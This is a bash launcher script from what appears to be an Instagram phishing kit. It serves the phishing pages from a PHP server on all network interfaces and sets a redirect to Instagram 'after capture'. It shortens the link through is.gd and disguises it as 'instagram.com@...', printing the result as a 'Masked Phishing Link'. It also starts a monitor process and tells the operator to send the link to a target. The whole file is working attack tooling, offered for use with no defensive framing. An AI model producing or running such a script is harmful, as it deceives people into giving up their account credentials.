#!/bin/bash

# ================================================
#  Localhost Tunnel Manager
# ================================================

echo -e "\e[1;33m[ Localhost Configuration ]\e[0m"

read -p "Enter port [8080]: " local_port
local_port=${local_port:-8080}

read -p "Landing URL after capture [https://www.instagram.com/]: " landing_url
landing_url=${landing_url:-"https://www.instagram.com/"}

# Start PHP server on all interfaces for LAN access
echo -e "\e[32m[+] Starting PHP server on 0.0.0.0:$local_port...\e[0m"
php -S 0.0.0.0:$local_port -t ../ > /dev/null 2>&1 &
php_pid=$!
sleep 2

# Get local IP
local_ip=$(hostname -I | awk '{print $1}')
local_url="http://${local_ip}:${local_port}"

# Also create localhost URL
localhost_url="http://127.0.0.1:${local_port}"

# Full URL with redirect
full_url="${local_url}/?redirect=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${landing_url}'))")"

# Shorten
shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${full_url}" 2>/dev/null || echo "$local_url")
masked_link="instagram.com@${shortened#https://}"
masked_link="${masked_link#http://}"

echo -e "\n\e[1;32m========================================\e[0m"
echo -e "\e[1;32m  Local Network URL:\e[0m"
echo -e "\e[1;37m  ${local_url}\e[0m"
echo -e "\e[1;32m  Masked Phishing Link:\e[0m"
echo -e "\e[1;37m  ${masked_link}\e[0m"
echo -e "\e[1;32m========================================\e[0m"

# Start monitor
python3 ../server/monitor.py &
monitor_pid=$!

echo -e "\e[32m[+] Server running. Use port forwarding or send local link to target.\e[0m"
echo -e "\e[33m[!] Press Ctrl+C to stop.\e[0m"

trap "kill $php_pid $monitor_pid 2>/dev/null; echo ''; exit 0" INT TERM
wait